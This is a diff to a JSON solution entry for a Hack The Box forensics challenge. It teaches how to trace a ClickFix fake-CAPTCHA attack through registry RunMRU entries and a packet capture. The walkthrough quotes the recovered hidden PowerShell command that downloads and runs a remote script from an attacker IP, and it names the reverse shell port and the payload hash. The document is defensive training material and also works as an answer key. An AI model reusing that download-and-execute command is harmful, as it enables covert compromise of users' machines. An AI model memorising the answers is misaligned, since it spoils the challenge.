@@ -5,71 +5,84 @@
   "htbUrl": "https://app.hackthebox.com/sherlocks/Pikaptcha",
   "difficulty": "easy",
   "estimatedTime": "1-2 hours",
-  "keyTakeaway": "ClickFix social engineering detection — identifying fake CAPTCHA pages that trick users into executing malicious PowerShell via Run dialog",
-  "tags": ["wireshark", "clickfix", "social-engineering", "powershell", "reverse-shell", "javascript"],
+  "keyTakeaway": "ClickFix social engineering detection — combining registry hive analysis with PCAP to trace a fake CAPTCHA attack from clipboard hijack to reverse shell",
+  "tags": ["wireshark", "clickfix", "social-engineering", "powershell", "reverse-shell", "registry", "runmru", "export-objects"],
   "fundamentals": {
-    "content": "## ClickFix Attacks & Social Engineering in PCAPs\n\n### What is ClickFix?\n\nClickFix is a social engineering technique where attackers create **fake CAPTCHA or verification pages** that instruct users to:\n1. Press `Win+R` to open the Run dialog\n2. Press `Ctrl+V` to paste a command (silently placed in clipboard by JavaScript)\n3. Press `Enter` to execute it\n\nThe command is typically a PowerShell one-liner that downloads and executes malware.\n\n### How It Appears in Network Traffic\n\n| Phase | What to Look For |\n|-------|------------------|\n| Delivery | HTTP request to a phishing page with fake CAPTCHA |\n| Clipboard staging | JavaScript calling `navigator.clipboard.writeText()` or similar |\n| Execution | DNS/HTTP requests to a staging server after user runs the command |\n| Payload | PowerShell script download (`.ps1` files) |\n| C2 | Reverse shell connection to attacker's IP |\n\n### Analyzing the Attack Chain\n\n1. **Find the phishing page** — look for HTTP requests to suspicious domains with JavaScript\n2. **Extract the JavaScript** — the `stageClipboard` or similar function reveals the malicious command\n3. **Track the payload download** — PowerShell downloads a `.ps1` file from a staging server\n4. **Identify the reverse shell** — outbound TCP connection to attacker's IP on an unusual port\n\n### RunMRU Registry Key\n\nWhen a user executes a command via the Run dialog (`Win+R`), Windows logs it in:\n`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU`\n\nThis is valuable forensic evidence that shows exactly what command was pasted and executed.",
+    "content": "## ClickFix Attacks & Multi-Artifact Analysis\n\nThis challenge introduces two new concepts: a modern social engineering technique called **ClickFix**, and multi-artifact analysis where you combine evidence from a **PCAP** and a **Windows Registry hive** to reconstruct an attack.\n\n### What is ClickFix?\n\nClickFix (MITRE ATT&CK T1204.004 — User Execution: Malicious Copy and Paste) is a social engineering technique where attackers create **fake CAPTCHA or verification pages** that trick users into executing malicious commands. The attack flow:\n\n1. Victim visits a page with a fake \"I'm not a robot\" CAPTCHA\n2. When the victim clicks the CAPTCHA button, **JavaScript silently copies a malicious command to their clipboard**\n3. The page instructs the victim to press `Win+R` (open Run dialog), `Ctrl+V` (paste), `Enter` (execute)\n4. The victim unknowingly executes a PowerShell command that downloads and runs malware\n\nThis technique is effective because it exploits user trust in CAPTCHA verification — people are trained to \"prove they're human\" and follow instructions without questioning them.\n\n### The Clipboard Hijack in JavaScript\n\nThe fake CAPTCHA page contains a JavaScript function (often named something like `stageClipboard`) that uses the Clipboard API:\n\n```javascript\nnavigator.clipboard.writeText(maliciousCommand);\n```\n\nThis silently replaces the clipboard contents with a PowerShell one-liner. When the user pastes into the Run dialog, they execute the attacker's command instead of anything they previously copied.\n\n### Registry Evidence: RunMRU\n\nWhen a user executes a command via the Run dialog (`Win+R`), Windows logs it in the registry at:\n\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\n```\n\nThis registry key stores the **most recently used** commands in the Run dialog. In forensics, this provides:\n- The exact command that was pasted and executed\n- The timestamp of when it was executed (from the key's last write time)\n\nTo analyze a registry hive file (`NTUSER.DAT`) on Linux, use tools like **Registry Explorer**, **regipy**, or **regripper**:\n\n```bash\n# Using regipy\nregipy-process-transaction-logs NTUSER.DAT NTUSER.DAT.LOG1 NTUSER.DAT.LOG2\nregipy-dump NTUSER.DAT\n```\n\n### Tracing the Attack in the PCAP\n\nAfter the user executes the clipboard command, the attack progresses through the network:\n\n| Phase | What to Look For |\n|-------|------------------|\n| Script download | HTTP GET request for a `.ps1` file |\n| Reverse shell | New TCP connection to attacker's IP on an unusual port |\n| Duration | Time between first SYN and last FIN/RST of the C2 connection |\n\nUse `File → Export Objects → HTTP` to extract the downloaded PowerShell script and examine its contents.\n\n### Measuring Connection Duration\n\nTo calculate how long a TCP connection lasted:\n1. `Statistics → Conversations → TCP` tab\n2. Find the connection by IP and port\n3. The duration column shows the time between first and last packet\n\nAlternatively, note the timestamp of the first SYN and last FIN/RST packet in the connection.\n\n### Hashing Extracted Files\n\nAfter extracting files from a PCAP, always hash them for identification:\n\n```bash\nsha256sum extracted_file.ps1\n```\n\nSearch the hash on VirusTotal to identify known malware families and get additional context.",
     "toolReferences": [
       {
         "tool": "Wireshark",
         "commands": [
-          "Filter: http (find initial page loads and script downloads)",
-          "Filter: http.request.uri contains \".ps1\" (PowerShell downloads)",
-          "Filter: tcp.port == 6969 (or whatever C2 port)",
-          "File > Export Objects > HTTP (extract downloaded files)",
-          "Follow TCP Stream on reverse shell connection"
+          "Filter: http — find page loads and script downloads",
+          "Filter: http.request.uri contains \".ps1\" — PowerShell downloads",
+          "File → Export Objects → HTTP — extract downloaded files",
+          "Follow TCP Stream on reverse shell connection",
+          "Statistics → Conversations → TCP — measure connection duration"
+        ]
+      },
+      {
+        "tool": "Registry analysis",
+        "commands": [
+          "regipy-dump NTUSER.DAT — dump registry hive contents",
+          "Navigate to: Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
+        ]
+      },
+      {
+        "tool": "CLI",
+        "commands": [
+          "sha256sum file.ps1 — compute SHA256 hash for VirusTotal lookup"
         ]
       }
     ]
   },
   "hints": {
     "hints": [
-      "Look for HTTP traffic to identify the initial phishing/ClickFix page the victim visited.",
-      "The malicious JavaScript function that stages the clipboard has a descriptive name — search the HTTP objects for JavaScript with clipboard-related functions.",
-      "After the user runs the clipboard command, a PowerShell script is downloaded. Filter for `.ps1` file requests.",
-      "The reverse shell connects to a specific IP and port. Look for an established TCP connection to an external IP on an unusual port after the PowerShell execution.",
-      "To find the reverse shell duration, calculate the time difference between the first and last packets in the C2 TCP stream.",
-      "The RunMRU registry key is referenced in the challenge — it records what was typed in the Win+R dialog."
+      "You have two artifacts: a PCAP and a registry hive (NTUSER.DAT with transaction logs). The registry reveals what command was executed and when; the PCAP shows what happened on the network as a result.",
+      "Analyze the RunMRU registry key to find the full PowerShell command the victim pasted into the Run dialog. The key's last write time gives the execution timestamp.",
+      "The PowerShell command downloads a `.ps1` script. Find the HTTP request in the PCAP and extract the script with `File → Export Objects → HTTP`. Hash it with `sha256sum`.",
+      "Read the extracted `.ps1` script — it contains a reverse shell using `System.Net.Sockets.TCPClient`. The target IP and port are hardcoded in the script.",
+      "For the connection duration, use `Statistics → Conversations → TCP` and find the C2 connection by IP and port.",
+      "The JavaScript function that staged the clipboard payload is in the fake CAPTCHA HTML page. Export HTTP objects to find and examine the page source."
     ]
   },
   "solution": {
-    "content": "## Full Walkthrough\n\n**Scenario:** A Forela employee encountered a fake CAPTCHA page that used the ClickFix technique to trick them into executing a malicious PowerShell command. This led to a reverse shell being established on their workstation.\n\n**Key findings:**\n\n| Element | Detail |\n|---------|--------|\n| JS function | `stageClipboard` |\n| PowerShell payload | `office2024install.ps1` |\n| C2 IP:Port | `43.205.115.44:6969` |\n| Shell duration | 403 seconds |\n| Registry evidence | RunMRU key |",
+    "content": "## Full Walkthrough\n\n**Scenario:** Forela employee Happy Grunwald received an email saying he needed to update Microsoft Office. He clicked the link, visited a website with a CAPTCHA, and solved it — but no download page appeared. Instead, a ClickFix attack tricked him into executing a malicious PowerShell command that established a reverse shell.\n\n**Evidence files:**\n- `pikaptcha.pcapng` — network capture\n- `NTUSER.DAT` + transaction logs — Happy Grunwald's registry hive\n\n**Key learning:** This challenge combines registry forensics with PCAP analysis. The registry tells you WHAT was executed and WHEN; the PCAP shows the network impact — script download, reverse shell establishment, and the fake CAPTCHA page itself.",
     "steps": [
       {
         "stepNumber": 1,
-        "description": "Identify the malicious JavaScript function",
-        "command": "Export HTTP objects and examine JavaScript files",
-        "explanation": "Use `File > Export Objects > HTTP` to extract all downloaded web content. Examine the JavaScript from the phishing page. The function responsible for staging the clipboard payload is named `stageClipboard` — it uses the Clipboard API to silently copy a malicious PowerShell command that the user is then tricked into pasting into the Run dialog. **Answer: `stageClipboard`**"
+        "description": "Find the full command executed via the Run dialog",
+        "command": "Analyze NTUSER.DAT → Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
+        "explanation": "Open the `NTUSER.DAT` registry hive using Registry Explorer or regipy (process the transaction logs first for complete data). Navigate to `Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU`. The most recent entry contains the full PowerShell command that was pasted from the clipboard:\n\n```\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')\"\n```\n\nThis is the classic ClickFix payload: hidden PowerShell window, execution policy bypass, download-and-execute in memory.\n\n**Answer:** `powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')\"`"
       },
       {
         "stepNumber": 2,
-        "description": "Find the PowerShell payload filename",
-        "command": "Wireshark filter: http.request.uri contains \".ps1\"",
-        "explanation": "After the victim executes the clipboard command, their machine downloads a PowerShell script. Filter for HTTP requests containing `.ps1` in the URI. The downloaded file is `office2024install.ps1` — named to look like a legitimate Office installation to avoid suspicion. **Answer: `office2024install.ps1`**"
+        "description": "Determine when the malicious payload was executed",
+        "command": "Check RunMRU key last write time",
+        "explanation": "The RunMRU registry key's last write time shows when the command was executed. This timestamp comes from the registry metadata, not the PCAP.\n\n**Answer:** `2024-09-23 05:07:45`"
       },
       {
         "stepNumber": 3,
-        "description": "Identify the reverse shell connection",
-        "command": "Look for outbound TCP connections to external IPs on unusual ports",
-        "explanation": "After the PowerShell payload executes, it establishes a reverse shell. Look for a new TCP connection from the victim to an external IP on an unusual port. The reverse shell connects to `43.205.115.44` on port `6969`. **Answer: `43.205.115.44:6969`**"
+        "description": "Extract the PowerShell script and compute its hash",
+        "command": "Wireshark: File → Export Objects → HTTP → save office2024install.ps1 → sha256sum",
+        "explanation": "In Wireshark, use `File → Export Objects → HTTP` to extract the downloaded `office2024install.ps1` script (1,355 bytes). Compute its SHA256 hash:\n\n```bash\nsha256sum office2024install.ps1\n```\n\nYou can search this hash on VirusTotal for malware family identification.\n\n**Answer:** `579284442094e1a44bea9cfb7d8d794c8977714f827c97bcb2822a97742914de`"
       },
       {
         "stepNumber": 4,
-        "description": "Calculate the reverse shell duration",
-        "command": "Follow TCP Stream on the C2 connection, note first and last packet timestamps",
-        "explanation": "Follow the TCP stream of the reverse shell connection. Note the timestamp of the first SYN packet and the last FIN/RST packet. The difference gives the session duration: **403 seconds** (approximately 6.7 minutes). This tells investigators how long the attacker had interactive access. **Answer: `403 seconds`**"
+        "description": "Identify the reverse shell port",
+        "command": "Read the extracted office2024install.ps1 script",
+        "explanation": "Open the extracted `.ps1` script. It contains a reverse shell using `System.Net.Sockets.TCPClient` that connects to the attacker's IP on a specific port. The port is hardcoded in the script.\n\nYou can also confirm this in the PCAP by filtering for traffic to `43.205.115.44`.\n\n**Answer:** `6969`"
       },
       {
         "stepNumber": 5,
-        "description": "Identify the registry key storing execution evidence",
-        "command": "Knowledge of Windows forensic artifacts",
-        "explanation": "The Run dialog (`Win+R`) logs all executed commands in the RunMRU registry key at `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU`. This provides forensic proof that the ClickFix command was pasted and executed via the Run dialog, confirming the social engineering vector. **Answer: RunMRU**"
+        "description": "Calculate the reverse shell connection duration",
+        "command": "Wireshark: Statistics → Conversations → TCP",
+        "explanation": "Open `Statistics → Conversations → TCP` and find the connection to `43.205.115.44` on port `6969`. The connection lasted from `05:07:48` to `05:14:31` UTC — the difference between the first SYN and the last FIN/RST.\n\n**Answer:** `403`"
       },
       {
         "stepNumber": 6,
-        "description": "Reconstruct the full ClickFix attack chain",
-        "command": "Correlate all findings",
-        "explanation": "The complete attack: (1) Victim visits a page with a fake CAPTCHA → (2) `stageClipboard` JS function copies a PowerShell command to clipboard → (3) Victim follows instructions: Win+R → Ctrl+V → Enter → (4) Command downloads `office2024install.ps1` from staging server → (5) Script executes and opens reverse shell to `43.205.115.44:6969` → (6) Attacker has interactive access for 403 seconds. Evidence of execution is stored in the RunMRU registry key."
+        "description": "Find the JavaScript function that staged the clipboard payload",
+        "command": "File → Export Objects → HTTP → examine the CAPTCHA HTML page",
+        "explanation": "Export the HTTP objects and find the initial HTML page the victim visited (the fake CAPTCHA page). Examine the JavaScript source code. The function that composes the malicious PowerShell command and writes it to the clipboard using the Clipboard API is named `stageClipboard`. When the victim clicks the fake \"I'm not a robot\" button, this function fires — silently replacing their clipboard contents.\n\n**Answer:** `stageClipboard`"
       }
     ]
   },
